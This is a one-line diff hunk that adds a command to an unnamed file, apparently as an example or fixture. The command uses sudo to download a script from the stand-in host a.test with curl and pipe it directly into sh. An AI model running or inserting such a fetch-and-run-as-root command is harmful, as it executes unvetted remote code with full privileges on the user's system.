@@ -1,0 +1,1 @@
+sudo timeout 5 bash -c 'curl -fsSL https://a.test/x | sh'
